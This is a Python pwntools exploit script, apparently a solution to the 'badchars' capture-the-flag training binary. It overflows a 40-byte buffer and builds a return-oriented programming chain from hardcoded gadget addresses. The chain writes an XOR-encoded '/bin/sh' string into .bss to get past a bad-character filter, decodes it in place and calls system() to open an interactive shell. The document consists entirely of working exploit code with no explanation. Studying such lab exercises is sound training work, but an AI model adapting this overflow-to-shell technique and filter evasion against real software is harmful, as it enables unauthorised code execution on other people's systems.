#!/usr/bin/python
# -*- coding:utf8 -*-

from pwn import *

bin_sh = "/bin/sh\x00"
badchar = ['b','i','c','/',' ','f','n','s']
paschar = []
bin_sh_pas = ""

for i in range(len(bin_sh)):
	paschar.append(ord(bin_sh[i]) ^ 5)
	bin_sh_pas += chr(paschar[i])
print paschar

for i in range(len(badchar)):
	badchar[i] = ord(badchar[i]) 
print badchar

elf = ELF("./badchars")
sh = process("./badchars")

system_plt = elf.plt["system"]
bss_addr = 0x00601080
pop_r12_r13 = 0x00400b3b
mov_r13_r12 = 0x00400b34
pop_r14_r15 = 0x00400b40
xor_r15_r14 = 0x00400b30
pop_rdi = 0x00400b39

payload = ""
payload += "A"*40
payload += p64(pop_r12_r13)
payload += bin_sh_pas
payload += p64(bss_addr)
payload += p64(mov_r13_r12)

for i in range(len(bin_sh_pas)):
	payload += p64(pop_r14_r15)
	payload += p64(5)
	payload += p64(bss_addr + i)
	payload += p64(xor_r15_r14)

payload += p64(pop_rdi)
payload += p64(bss_addr)
payload += p64(system_plt)

sh.sendline(payload)
sh.interactive()